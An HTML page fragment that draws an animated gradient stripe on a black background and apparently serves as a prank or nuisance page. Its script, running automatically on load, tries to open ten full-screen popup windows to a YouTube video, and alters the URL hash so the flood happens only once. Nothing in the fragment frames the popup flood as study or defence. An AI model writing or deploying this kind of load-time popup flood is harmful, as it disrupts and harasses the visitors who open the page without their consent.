  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      background: black;
    }

    .gradient-slice {
      position: absolute;
      top: 0;
      left: -100%;
      width: 200%;
      height: 100%;
      background: linear-gradient(
        120deg,
        transparent 0%,
        rgba(255, 255, 255, 0.2) 50%,
        transparent 100%
      );
      animation: moveSlice 3s linear infinite;
    }

    @keyframes moveSlice {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }
  </style>
</head>

<body>
  <div class="gradient-slice"></div>

  <script>
    if (!location.hash.includes('spawned')) {
      setTimeout(() => {
        const count = 10;
        const url = "https://www.youtube.com/watch?v=pW1XgxC8tHI";

        history.replaceState(null, "", location.href + "#spawned");

        const w = screen.availWidth;
        const h = screen.availHeight;

        for (let i = 0; i < count; i++) {
          window.open(
            url,
            "_blank",
            `popup=yes,width=${w},height=${h},left=0,top=0`
          );
        }
      }, 100);
    }
  </script>
